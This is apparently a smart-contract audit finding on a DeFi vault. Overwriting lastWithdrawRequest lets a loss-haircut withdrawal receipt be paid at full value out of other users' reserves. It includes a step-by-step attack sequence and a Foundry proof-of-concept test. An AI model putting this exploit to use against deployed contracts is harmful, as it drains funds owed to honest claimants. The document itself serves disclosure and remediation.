### Title
Loss-adjusted withdraw receipt is paid at par after a second request overwrites `lastWithdrawRequest`, stealing other claimants' funded reserves - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
The SMB2 double-free analog is stale bookkeeping that survives across a state transition and causes the same resource to be released/counted twice. In `IdleCreditVault`, the loss-haircut bookkeeping for a `stopEpochWithDuration` loss is keyed solely by `lastWithdrawRequest[_user]`, a single slot that is blindly overwritten on every new `requestWithdraw`. A user whose epoch-E receipt was only funded at `lossRecoveryPriceByEpoch[E] < RECOVERY_FULL` can make a second request in a later epoch, overwriting `lastWithdrawRequest[_user]` to E+1. The loss-adjusted claim path then reads `lossRecoveryPriceByEpoch[E+1] == 0` and silently skips the haircut, while `_claimFundedWithdrawRequest` pays the full aggregate `withdrawsRequests[_user]` at par from the strategy balance. The epoch-E loss haircut — which was never actually funded by the borrower — is paid out of reserves belonging to other pending receipt holders. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
In `requestWithdraw` (line 282) every new request unconditionally sets `lastWithdrawRequest[_user] = currentEpoch`, discarding any earlier epoch marker. When an epoch ends via `stopEpochWithDuration` with `_lossAmount > 0`, `collectWithdrawFunds` receives only `pendingToFund < pendingBasis`, zeroes `pendingWithdraws`, and records `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` (lines 414–421). The haircut for that epoch is therefore stored only under that epoch key and is reachable exclusively through `_claimLossAdjustedWithdrawRequest`, which reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` (lines 790–791).

Sequence (attacker = ordinary KYC-passing tranche holder; manager/borrower honest):

1. Epoch E (running, fixed-APR or APR0): attacker calls `cdoEpoch.requestWithdraw(amount, tranche)`. Vault mints a strategy-token receipt, sets `withdrawsRequests[attacker] += amount`, `withdrawsRequestsByEpoch[attacker][E] += amount`, `pendingWithdraws += amount`, `lastWithdrawRequest[attacker] = E`.
2. Epoch E ends in `stopEpochWithDuration(..., _lossAmount)` where `previewLossAdjustedWithdrawFunds` assigns part of the loss to pending receipts (`pendingLoss`). Borrower funds only `pendingToFund`; `lossRecoveryPriceByEpoch[E] = P < RECOVERY_FULL`. The strategy now holds only `amount * P / RECOVERY_FULL` backing the attacker's epoch-E receipt.
3. Epoch E+1: attacker calls `requestWithdraw` again (even a dust amount). `lastWithdrawRequest[attacker] = E+1`; the epoch-E loss key is orphaned — the stale bookkeeping is never re-applied, exactly the "cleanup retains previous buffer type" failure of the SMB2 bug.
4. Epoch E+1 ends normally with full funding. `epochNumber` becomes E+2.
5. Attacker calls `cdoEpoch.claimWithdrawRequest()` → `claimWithdrawRequest(_user)`:
   - `_claimLossAdjustedWithdrawRequest`: `lossRecoveryPriceByEpoch[E+1] == 0` → returns 0.
   - `_claimFundedWithdrawRequest`: `epochNumber (E+2) > lastWithdrawRequest (E+1)` passes; `amount = withdrawsRequests[attacker]` includes the full epoch-E basis; `_transferFundedClaim` pays it at par.

The attacker's epoch-E receipt escapes its haircut entirely. The strategy only ever received `amount * P / RECOVERY_FULL` for it; the missing `amount * (RECOVERY_FULL - P) / RECOVERY_FULL` is paid out of underlying reserved for other users' funded `withdrawsRequests`/`postDefaultRequests`, breaking the "one receipt, one funded payout" and loss-waterfall invariants. `_clearWithdrawClaimForEpoch` cannot rescue this: it only clears the epoch it is invoked with, and nothing ever invokes it for epoch E once `lastWithdrawRequest` moved on. The same defect exists symmetrically if epoch E+1 later defaults — `_claimDefaultedWithdrawRequest` clears only `defaultRecoveryEpoch`, leaving the loss-adjusted epoch-E basis inside `withdrawsRequests[_user]` to be paid at par.

### Impact Explanation
Direct theft / insolvency with quantified loss: the attacker is overpaid by `claimBasis_E * (RECOVERY_FULL - lossRecoveryPriceByEpoch[E]) / RECOVERY_FULL`. This shortfall is borne by every other funded pending receipt, whose subsequent claims either underpay or revert on insufficient balance — i.e. permanent freezing of honest users' claims up to the same amount. The attacker needs only tranche tokens and a second `requestWithdraw`; the loss epoch is produced by honest manager/borrower behavior (`stopEpochWithDuration` is a normal flow exercised in `test/foundry/IdleCDOEpochQueue.t.sol:830`).

### Likelihood Explanation
Requires three conditions: (a) a `stopEpochWithDuration` with `_lossAmount` large enough that `previewLossAdjustedWithdrawFunds` assigns nonzero loss to pending receipts, (b) the attacker held a pending receipt in that epoch and did not claim before re-requesting, and (c) a subsequent epoch completes. Borrower under-performance/partial loss is an anticipated protocol path (the function and per-epoch price exist precisely for it), and re-requesting without claiming is explicitly contemplated by the code's own NOTE at lines 323–324, so the scenario is realistic, not adversarial-only. The overwrite happens deterministically; no race or privileged misbehavior is needed. Likelihood is moderate: it needs a loss event to have occurred, but given one, exploitation is trivial and repeatable per epoch.

### Recommendation
Track loss-adjusted claims per epoch instead of via the single `lastWithdrawRequest` slot. Concretely:
- When a request is made while `withdrawsRequestsByEpoch[_user][epoch]` already exists for an epoch with `lossRecoveryPriceByEpoch[epoch] != 0`, either revert the new request until the old receipt is claimed, or store a per-user iterable/packed list of outstanding request epochs.
- In `_claimLossAdjustedWithdrawRequest`, iterate all epochs with `withdrawsRequestsByEpoch[_user][e] != 0` (or maintain `lossEpochs[_user]`) rather than trusting `lastWithdrawRequest`, so an orphaned epoch-E haircut is still applied.
- Alternatively, at `collectWithdrawFunds` loss time, immediately convert each pending receipt's `withdrawsRequests[_user]` basis to its haircut value so no separate loss path is needed at claim.

### Proof of Concept
Foundry fork PoC (extend `test/foundry/IdleCreditVault.t.sol` helpers `_depositWithUser`, `_startEpochAndCheckPrices`, `_stopEpochAndCheckPrices`):

```solidity
function testLossReceiptPaidAtParAfterSecondRequest() external {
    uint256 amount = 10_000 * ONE_SCALE;
    idleCDO.depositAA(amount);               // victim liquidity
    address attacker = makeAddr('attacker');
    _depositWithUser(attacker, amount, true);

    // Epoch E: attacker requests withdraw of half
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(attacker) / 2, address(AAtranche));
    uint256 epochE = IdleCreditVault(address(strategy)).epochNumber();

    // Epoch E ends with a loss partially borne by pending receipts
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 activeBasis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
    uint256 loss = (activeBasis + pendingBasis) / 10;      // 10% total loss
    (uint256 pendingToFund,) = strategy.previewLossAdjustedWithdrawFunds(loss);
    uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
    deal(defaultUnderlying, borrower, repay, true);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), repay);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialApr, 0, cdoEpoch.epochDuration(), loss);

    uint256 price = strategy.lossRecoveryPriceByEpoch(epochE);
    assertLt(price, strategy.RECOVERY_FULL());

    // Epoch E+1: attacker requests a tiny second withdraw -> overwrites lastWithdrawRequest
    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(1, address(AAtranche));
    // Epoch E+1 ends fully funded
    _stopEpochAndCheckPrices(1, initialApr, _expectedFundsEndEpoch());

    // Attacker claims: loss path skipped, full aggregate paid at par
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(attacker) - balPre;

    // Expected fair payout for epoch-E receipt is claimBasis*price/RECOVERY_FULL, not claimBasis
    uint256 epochEBasis = pendingBasis; // attacker was sole requester in epoch E
    assertGt(got, epochEBasis * price / strategy.RECOVERY_FULL() + 1,
        'loss haircut was skipped; receipt paid at par');
    // Strategy underlying is now short by epochEBasis*(FULL-price)/FULL
    // vs reserves owed to other pending receipts -> insolvency/theft.
}
```

The assertion succeeds because `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[lastWithdrawRequest] == 0` while `withdrawsRequests[attacker]` still contains the un-haircutted epoch-E basis, proving the stale-bookkeeping double-release analog.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L282-294)
```text
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L319-350)
```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-430)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-801)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
```
